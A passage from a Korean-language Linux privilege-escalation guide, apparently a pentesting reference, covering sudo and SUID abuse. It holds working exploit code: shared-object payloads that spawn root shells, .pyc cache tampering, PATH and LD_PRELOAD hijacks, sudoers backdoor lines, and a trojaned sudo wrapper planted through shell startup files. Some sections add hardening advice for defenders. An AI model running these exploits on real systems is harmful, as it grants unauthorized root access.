  - CPython은 바이트코드 캐시를 `__pycache__/module.cpython-<ver>.pyc`에 저장합니다.<sup>[[31]](#references)</sup>
  - 인터프리터는 **헤더**(매직 값 + 소스와 연결된 타임스탬프/해시 메타데이터)를 검증한 다음, 헤더 뒤에 저장된 marshaled 코드 객체를 실행합니다.
  - 디렉터리에 쓰기 권한이 있어 캐시 파일을 **삭제하고 다시 만들 수 있다면**, root 소유이지만 쓰기 불가능한 `.pyc`도 바꿀 수 있습니다.
- 일반적인 경로:
  - `sudo -l`에 root로 실행할 수 있는 Python 스크립트나 wrapper가 표시됩니다.
  - 해당 스크립트는 `/opt/app/`, `/usr/local/lib/...` 등의 경로에서 로컬 모듈을 import합니다.
  - import된 모듈의 `__pycache__` 디렉터리는 사용자 또는 모든 사용자가 쓸 수 있습니다.

빠른 열거:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

권한이 있는 스크립트를 검사할 수 있다면, import된 모듈과 해당 모듈의 캐시 경로를 식별하세요:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

악용 워크플로:

1. sudo 실행이 허용된 스크립트를 한 번 실행해 Python이 정상적인 캐시 파일을 만들도록 합니다. 캐시 파일이 이미 있으면 이 단계는 필요하지 않습니다.
2. 정상적인 `.pyc`에서 처음 16바이트를 읽어 감염된 파일에 재사용합니다.
3. 페이로드 code object를 컴파일하고 `marshal.dumps(...)`로 직렬화한 다음, 원래 캐시 파일을 삭제하고 원래 헤더와 악성 바이트코드를 결합해 다시 만듭니다.
4. sudo 실행이 허용된 스크립트를 다시 실행해 import가 root 권한으로 페이로드를 실행하도록 합니다.

중요 참고 사항:

- 원래 헤더를 재사용하는 것이 핵심입니다. Python은 캐시 메타데이터를 소스 파일과 비교할 뿐, 바이트코드 본문이 실제로 소스와 일치하는지는 확인하지 않습니다.
- 소스 파일은 root 소유이며 쓰기 불가능하지만, 이를 포함하는 `__pycache__` 디렉터리는 쓰기 가능한 경우 특히 유용합니다.
- `PYTHONDONTWRITEBYTECODE=1`과 `python -B`는 Python이 새 `.pyc` 파일을 기록하지 못하게 합니다. 하지만 이미 유효한 것으로 판단되는, 공격자가 교체한 캐시를 불러오는 것까지 막지는 않습니다. 핵심 경계는 권한이 낮은 사용자가 권한이 높은 import에서 허용되는 캐시를 교체할 수 있는지 여부입니다. Python은 캐시된 바이트코드를 불러오기 전에 타임스탬프/크기 또는 해시 메타데이터를 확인합니다. [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation)와 [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE)를 참조하세요.

최소 proof-of-concept 형태:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

강화:

- 권한이 낮은 사용자가 `__pycache__`를 포함해 권한이 높은 Python import 경로의 어떤 디렉터리도 쓸 수 없도록 합니다.
- 기존 `.pyc` 파일을 포함해 캐시 디렉터리의 소유권과 권한을 감사하세요. 바이트코드 쓰기를 비활성화하면 새 캐시 생성을 줄일 수 있지만, 교체 가능한 기존 캐시를 무력화하지는 않습니다.
- 쓰기 가능한 로컬 Python 모듈과 캐시 디렉터리는 root로 실행되는 쓰기 가능한 셸 스크립트나 공유 라이브러리와 동일하게 취급하세요.

### sudo env_keep을 통해 보존된 BASH_ENV → root 셸

sudoers가 `BASH_ENV`를 보존하는 경우(예: `Defaults env_keep+="ENV BASH_ENV"`), 허용된 명령을 실행할 때 Bash의 비대화형 시작 동작을 이용해 root 권한으로 임의의 코드를 실행할 수 있습니다.<sup>[[24]](#references)</sup>

- 작동 원리: 비대화형 셸에서 Bash는 대상 스크립트를 실행하기 전에 `$BASH_ENV`를 평가하고 해당 파일을 소스로 불러옵니다. 많은 sudo 규칙은 스크립트나 셸 래퍼 실행을 허용합니다. sudo가 `BASH_ENV`를 보존하면 해당 파일은 root 권한으로 소스 처리됩니다.<sup>[[23]](#references)</sup>

- 요구 사항:
  - 실행 가능한 sudo 규칙(비대화형으로 `/bin/bash`를 호출하는 대상 또는 Bash 스크립트).
  - `env_keep`에 `BASH_ENV`가 포함되어 있어야 합니다(`sudo -l`로 확인).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - `env_keep`에서 `BASH_ENV`(및 `ENV`)를 제거하고, `env_reset`을 사용하는 것이 좋습니다.
  - sudo가 허용하는 명령에는 shell wrapper를 사용하지 말고 최소한의 바이너리를 사용하세요.
  - 보존된 환경 변수가 사용될 때 sudo I/O logging 및 alerting을 고려하세요.

### sudo에서 보존된 HOME을 통한 Terraform 실행 (!env_reset)

sudo에서 더 높은 권한의 사용자로 Terraform을 실행할 수 있는 경우, `!env_reset`은 해당 규칙에서 실제로 어떤 환경 변수가 유지되는지 확인하라는 단서입니다. 호출자가 쓰기 가능한 `.terraformrc` 또는 `terraform.rc`를 활성 CLI 설정으로 간주하기 전에, 실제로 적용되는 `HOME` 또는 `TF_CLI_CONFIG_FILE`을 확인하세요. `provider_installation.dev_overrides` 항목은 Terraform 명령이 해당 provider를 불러오고, 호출자가 선택된 디렉터리에 실행 파일을 배치할 수 있는 경우에만 유효합니다.<sup>[[25]](#references)</sup>

- 필요한 provider가 쓰기 가능한 디렉터리를 가리키도록 설정하고, provider 이름을 딴 악성 플러그인(예: `terraform-provider-examples`)을 배치하세요:

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform는 Go plugin handshake에 실패하지만, 종료되기 전에 payload를 root 권한으로 실행하여 SUID shell을 남깁니다.

### TF_VAR 오버라이드 + symlink 검증 우회

특정 sudo 규칙이 환경 변수를 보존하는 경우, `TF_VAR_<name>` 환경 변수를 통해 Terraform 변수를 전달할 수 있습니다. source-symlink **읽기**를 악용하려면 링크를 따라가 보호된 결과를 호출자가 읽을 수 있는 대상에 복사하는 provider도 필요합니다. destination-symlink **쓰기**를 악용하려면 별도로 호출자가 제어하는 대상 경로 항목과 쓰기 시 해당 경로를 따라가는 권한이 높은 provider가 필요합니다. 이후 예약된 작업은 발생할 수 있는 결과 중 하나일 뿐입니다. 두 경로 중 어느 쪽이든 테스트하기 전에 `sudo -l`, `stat`, `readlink`와 같은 읽기 전용 명령을 사용해 정확한 sudo 권한, 관련 `.tf` 파일, 선택된 CLI 설정, 경로 소유권을 확인하세요. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`와 같은 취약한 문자열 기반 검증은 symlink를 따라가 확인하지 않습니다:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform은 symlink를 해석하고 실제 `/root/root.txt`를 공격자가 읽을 수 있는 대상 경로에 복사합니다. 같은 방법으로 대상 symlink를 미리 만들어 권한이 필요한 경로에 **쓸** 수도 있습니다(예: provider의 대상 경로가 `/etc/cron.d/` 내부를 가리키도록 설정).

### requiretty / !requiretty

일부 구형 배포판에서는 sudo가 `requiretty`로 설정되어 sudo를 대화형 TTY에서만 실행하도록 강제할 수 있습니다. `!requiretty`가 설정되어 있거나 해당 옵션이 없으면, reverse shell, cron 작업 또는 스크립트와 같은 비대화형 컨텍스트에서도 sudo를 실행할 수 있습니다.

```bash
Defaults !requiretty
```

이는 그 자체로 직접적인 취약점은 아니지만, 전체 PTY 없이 sudo 규칙을 악용할 수 있는 상황을 늘립니다.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l`에 `env_keep+=PATH`가 표시되거나 `secure_path`에 공격자가 쓸 수 있는 항목(예: `/home/<user>/bin`)이 포함되어 있으면, sudo가 허용한 대상 내부의 경로를 지정하지 않은 외부 명령이 가려질 수 있습니다.<sup>[[3]](#references)</sup> 유효한 `secure_path`가 없는 경우에도 **sudo 환경이 호출자가 제어하는 `PATH`를 유지한다면** 검토할 필요가 있습니다. `secure_path`가 없다는 사실만으로 `PATH`가 유지된다고 단정할 수는 없습니다. 허용된 스크립트를 실행하지 말고 읽은 다음, 정확한 RunAs 및 인자 규칙, 유효한 명령 검색 경로, 그리고 명령 이름을 포함하며 앞에서 검색되는 쓰기 및 탐색 가능한 디렉터리를 확인하세요. 인증, `NOEXEC`, 셸 내장 명령, 절대 경로로 지정된 명령은 결과를 바꿀 수 있습니다.

- 요구 사항: 경로를 지정하지 않고 명령(`free`, `df`, `ps` 등)을 호출하는 스크립트/바이너리를 실행하는 sudo 규칙(대개 `NOPASSWD`)과 가장 먼저 검색되는 쓰기 가능한 `PATH` 항목이 필요합니다.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo 실행 경로 우회
**다른 파일로 이동**해 읽거나 **symlinks**를 사용하세요. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**wildcard**를 사용하면 (\*) 훨씬 더 쉽습니다:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 명령어 경로가 없는 Sudo 명령어/SUID 바이너리

**sudo 권한**이 단일 명령어에 **경로를 지정하지 않고** 부여된 경우: _hacker10 ALL= (root) less_ PATH 변수를 변경하여 이를 악용할 수 있습니다.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

이 기법은 **suid** 바이너리가 **경로를 지정하지 않고 다른 명령을 실행하는 경우에도 사용할 수 있습니다(이상한 SUID 바이너리의 내용은 항상** _**strings**_ **로 확인하세요)**.

[실행할 Payload 예시](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### 명령 경로를 지정하는 SUID 바이너리

**suid** 바이너리가 **경로를 지정해 다른 명령을 실행하는 경우**, 해당 suid 파일이 호출하는 명령 이름으로 **함수를 내보내기**를 시도할 수 있습니다.

예를 들어, suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 함수를 만들고 내보내야 합니다:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

그런 다음 SUID binary를 호출하면 이 함수가 실행됩니다.

### Custom SUID copy wrappers

소유자가 root인 SUID 유틸리티가 소스 및 대상 경로를 인수로 받으면 서로 다른 두 신뢰 경계를 넘을 수 있습니다. 두 인수 중 하나를 사용해 셸 명령을 구성하는 경우(예: 구성한 `cp` 명령을 `system()`에 전달), 셸 메타문자로 인해 유효 권한으로 다른 명령이 실행될 수 있습니다. 셸을 사용하지 않고 `cp`를 안전하게 실행하더라도, 제한되지 않은 대상 경로로 인해 `/etc/passwd` 같은 파일에 임의의 권한 쓰기가 가능할 수 있습니다. 래퍼의 인수 처리, effective UID 동작, 대상 경로 제한, 복사된 파일의 내용이 호출자에 의해 제어되는지 검토하세요. 일반적인 `cp` 오류나 SUID 비트만으로 어느 쪽이든 입증되는 것은 아닙니다. 수동 테스트를 하기 전에 바이너리와 권한을 수동 변경 없이 열거하세요.

### SUID wrapper가 실행하는 쓰기 가능한 script

흔히 발생하는 custom-app 설정 오류는 소유자가 root인 SUID binary wrapper가 script를 실행하는데, 해당 script는 권한이 낮은 사용자가 쓸 수 있는 경우입니다.

일반적인 패턴은 다음과 같습니다.

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh`에 쓰기 권한이 있다면 payload 명령을 추가한 다음 SUID wrapper를 실행할 수 있습니다:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

빠른 점검:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

이 attack path는 `/usr/local/bin`에 포함된 "maintenance"/"backup" wrapper에서 특히 흔합니다.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 로더가 표준 C 라이브러리(`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 로드할 하나 이상의 공유 라이브러리(.so 파일)를 지정하는 데 사용됩니다. 이 과정을 라이브러리 preloading이라고 합니다.

그러나 시스템 보안을 유지하고 이 기능이 악용되는 것을 방지하기 위해, 특히 **suid/sgid** 실행 파일과 관련해 시스템은 다음 조건을 적용합니다.

- 실제 사용자 ID(_ruid_)와 유효 사용자 ID(_euid_)가 일치하지 않는 실행 파일의 경우 로더는 **LD_PRELOAD**를 무시합니다.
- suid/sgid 실행 파일의 경우 suid/sgid이기도 한 표준 경로의 라이브러리만 preload됩니다.

`sudo`로 명령을 실행할 수 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD** 문이 포함되어 있으면 권한 상승이 발생할 수 있습니다. 이 설정에서는 **LD_PRELOAD** 환경 변수가 유지되고 `sudo`로 명령을 실행할 때도 인식되므로, 상승된 권한으로 임의의 코드를 실행할 가능성이 있습니다.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c**로 저장하십시오.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

그런 다음 다음을 사용하여 **컴파일하세요**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

마지막으로, **escalate privileges**를 실행하여

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 공격자가 **LD_LIBRARY_PATH** 환경 변수를 제어하면 라이브러리를 검색할 경로를 지정할 수 있으므로, 유사한 privesc를 악용할 수 있습니다.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

이상해 보이는 **SUID** 권한의 바이너리를 발견하면 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령을 실행해 확인할 수 있습니다:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

예를 들어 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_와 같은 오류가 발생하면 악용 가능성이 있을 수 있습니다.

이를 악용하려면 _"/path/to/.config/libcalc.c"_와 같은 C 파일을 만들고, 다음 코드를 작성합니다:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

이 코드는 컴파일하여 실행하면 파일 권한을 조작하고 권한이 상승된 셸을 실행해 권한을 높이는 것을 목표로 합니다.

위의 C 파일을 다음 명령으로 shared object(.so) 파일로 컴파일합니다:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

마지막으로, 영향을 받는 SUID 바이너리를 실행하면 exploit이 트리거되어 시스템이 침해될 가능성이 있습니다.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

이제 쓰기 권한이 있는 폴더에서 라이브러리를 로드하는 SUID 바이너리를 찾았으니, 필요한 이름으로 해당 폴더에 라이브러리를 만들어 보겠습니다:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

다음과 같은 오류가 발생하면

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

즉, 생성한 라이브러리에는 `a_function_name`이라는 함수가 있어야 합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)는 공격자가 로컬 보안 제한을 우회하는 데 악용할 수 있는 Unix 바이너리를 정리한 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/)는 명령에 **인수만 삽입할 수 있는** 경우를 위한 동일한 목록입니다.

이 프로젝트는 제한된 셸에서 탈출하거나, 권한을 상승 또는 유지하거나, 파일을 전송하거나, 바인드 및 리버스 셸을 생성하거나, 기타 post-exploitation 작업을 수행하는 데 악용할 수 있는 Unix 바이너리의 정당한 기능을 모아 둡니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l`에 접근할 수 있다면 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 도구를 사용해 sudo 규칙을 악용할 방법을 찾을 수 있는지 확인할 수 있습니다.

### Sudo 토큰 재사용

**sudo 접근 권한**은 있지만 비밀번호가 없는 경우, **sudo 명령이 실행될 때까지 기다린 후 세션 토큰을 탈취해** 권한을 상승할 수 있습니다.<sup>[[18]](#references)</sup>

권한 상승 요건:

- 이미 사용자 "_sampleuser_"로 셸에 접속한 상태여야 합니다.
- "_sampleuser_"가 **지난 15분 이내에** 무언가를 실행하는 데 `sudo`를 **사용했어야 합니다** (기본적으로 sudo 토큰은 이 시간 동안 유효하며, 이 토큰을 사용하면 비밀번호를 입력하지 않고 `sudo`를 사용할 수 있습니다).
- `cat /proc/sys/kernel/yama/ptrace_scope`의 결과가 0이어야 합니다.
- `gdb`에 접근할 수 있어야 합니다 (업로드할 수도 있습니다).

(`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 실행하거나 `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정해 `kernel.yama.ptrace_scope = 0`으로 설정하면 `ptrace_scope`를 일시적으로 활성화할 수 있습니다.)

이 요건을 모두 충족하면 다음을 사용해 **권한을 상승할 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **첫 번째 exploit** (`exploit.sh`)은 _/tmp_에 `activate_sudo_token` 바이너리를 생성합니다. 이 바이너리를 사용해 **세션에서 sudo 토큰을 활성화할 수 있습니다** (자동으로 root 셸을 얻지는 않습니다. `sudo su`를 실행하세요):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **두 번째 exploit** (`exploit_v2.sh`)은 _/tmp_에 sh 셸을 생성하며, **root 소유이고 setuid가 설정됩니다**.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **세 번째 exploit**(`exploit_v3.sh`)은 **sudoers 파일을 생성하여 sudo 토큰이 영구적으로 유지되게 하고 모든 사용자가 sudo를 사용할 수 있도록 합니다**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

폴더 또는 폴더 안에 생성된 파일 중 하나에 **쓰기 권한**이 있다면, 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용해 **사용자와 PID에 대한 sudo token을 생성**할 수 있습니다.\
예를 들어, _/var/run/sudo/ts/sampleuser_ 파일을 덮어쓸 수 있고 해당 사용자로 PID 1234인 셸을 실행 중이라면, 비밀번호를 알 필요 없이 다음을 실행해 **sudo 권한을 얻을 수 있습니다**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` 파일과 `/etc/sudoers.d` 내부의 파일은 누가 `sudo`를 사용할 수 있는지, 그리고 어떻게 사용할 수 있는지를 설정합니다. 기본적으로 이 파일들은 사용자 root와 그룹 root만 읽을 수 있습니다.\
**이 파일을 읽을 수 있다면** 흥미로운 정보를 **얻을 수 있으며**, 파일을 **쓸 수 있다면** 권한을 **상승시킬 수 있습니다**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

이 권한을 사용해 파일을 쓸 수 있다면 악용할 수도 있습니다.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

이러한 권한을 악용하는 또 다른 방법:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD용 `doas`처럼 `sudo` 바이너리를 대체하는 도구도 있습니다. `/etc/doas.conf`의 설정을 확인하세요.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas`가 에디터나 인터프리터를 허용한다면, GTFOBins 스타일의 이스케이프를 확인하세요:

```bash
doas vim
:!/bin/sh
```

A root 권한을 사용할 수 있는 `doas` 규칙이 원래 Python 기반인 `dstat`에 적용된다면 plugin 경로도 검토할 가치가 있습니다. 해당 [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)과 [source](https://github.com/dstat-real/dstat/blob/master/dstat)에는 `dstat_*.py` plugin을 찾는 위치로 `/usr/share/dstat/` 및 `/usr/local/share/dstat/`가 나와 있습니다. 현재 사용자가 설치된 빌드에서 실제로 사용하는 위치에 쓰기 및 검색 권한이 있다면, 선택한 plugin이 `doas`의 RunAs identity로 실행될 수 있습니다. 적용되는 규칙, 해당 빌드의 plugin 검색 방식, 디렉터리와 상위 디렉터리의 권한 또는 ACL, 그리고 호출자가 plugin을 선택할 수 있는지 확인하세요. `dstat` 규칙이나 쓰기 가능한 디렉터리만으로는 단서일 뿐입니다. 다른 `dstat` 구현은 서로 다른 plugin 시스템을 사용할 수 있습니다. plugin을 로드하지 말고 메타데이터를 수동적으로 검사하세요.

### Sudo Hijacking

사용자가 **보통 시스템에 접속해 권한을 상승시키기 위해 `sudo`를 사용한다는 것을 알고 있고**, 해당 사용자 컨텍스트에서 shell을 얻었다면 **root 권한으로 코드를 실행한 다음 사용자의 명령을 실행하는 새 sudo executable을 만들 수 있습니다**. 그런 다음 사용자 컨텍스트의 **$PATH를 수정**(예: `.bash_profile`에 새 경로를 추가)하여 사용자가 sudo를 실행할 때 새 sudo executable이 실행되도록 합니다.

사용자가 다른 shell(bash가 아닌 shell)을 사용한다면 새 경로를 추가하기 위해 다른 파일을 수정해야 합니다. 예를 들어 [sudo-piggyback](https://github.com/APTy/sudo-piggyback)는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서도 다른 예시를 확인할 수 있습니다.

또는 다음과 비슷한 명령을 실행할 수 있습니다:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 공유 라이브러리

### ld.so

`/etc/ld.so.conf` 파일은 **로드된 구성 파일의 위치를 나타냅니다**. 일반적으로 이 파일에는 다음 경로가 포함됩니다: `include /etc/ld.so.conf.d/*.conf`

즉, `/etc/ld.so.conf.d/*.conf`의 구성 파일을 읽습니다. 이러한 구성 파일은 **라이브러리를 검색할 다른 폴더를 가리킵니다**. 예를 들어 `/etc/ld.so.conf.d/libc.conf`의 내용은 `/usr/local/lib`입니다. **이는 시스템이 `/usr/local/lib`에서 라이브러리를 검색한다는 의미입니다**.

어떤 이유로든 **사용자에게** `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내의 파일 또는 `/etc/ld.so.conf.d/*.conf` 내 구성 파일에 지정된 폴더에 대한 쓰기 권한이 있다면 권한 상승이 가능할 수 있습니다.\
다음 페이지에서 **이 잘못된 구성을 악용하는 방법**을 확인하세요:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib`를 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 이 경로의 프로그램에서 해당 라이브러리를 사용하게 됩니다.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

그런 다음 다음 명령을 사용해 /var/tmp에 악성 라이브러리를 생성합니다: gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities는 **프로세스에 사용 가능한 root 권한의 하위 집합을 제공**합니다. 이는 root **권한을 더 작고 구분되는 단위로 나누는** 효과가 있습니다. 이렇게 나뉜 각 단위는 프로세스에 독립적으로 부여할 수 있습니다. 이 방식으로 전체 권한 집합이 축소되어 exploitation 위험이 줄어듭니다.\
다음 페이지에서 **capabilities와 이를 악용하는 방법에 대해 자세히 알아보세요**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

디렉터리에서 **"execute" 비트**는 해당 사용자가 폴더로 "**cd**"할 수 있음을 의미합니다.\
**"read" 비트**는 사용자가 **파일**을 **나열**할 수 있음을 의미하며, **"write" 비트**는 사용자가 새 **파일**을 **삭제**하고 **생성**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 임의 권한의 보조 계층으로, 기존 ugo/rwx 권한을 **재정의할 수 있습니다**. 이 권한은 소유자가 아니거나 그룹에 속하지 않은 특정 사용자에게 권한을 허용하거나 거부하여 파일 또는 디렉터리 액세스를 더 세밀하게 제어합니다. 이러한 **세분성 덕분에 더 정밀하게 액세스를 관리할 수 있습니다**. 자세한 내용은 [**여기**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인할 수 있습니다.<sup>[[19]](#references)</sup>

사용자 "kali"에게 파일에 대한 읽기 및 쓰기 권한 **부여**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**시스템에서 특정 ACL이 설정된 파일을 가져오기:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in의 숨겨진 ACL 백도어

흔한 잘못된 설정은 `/etc/sudoers.d/`에 있는 mode `440`의 root 소유 파일이 ACL을 통해 권한이 낮은 사용자에게 여전히 쓰기 권한을 부여하는 것입니다.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

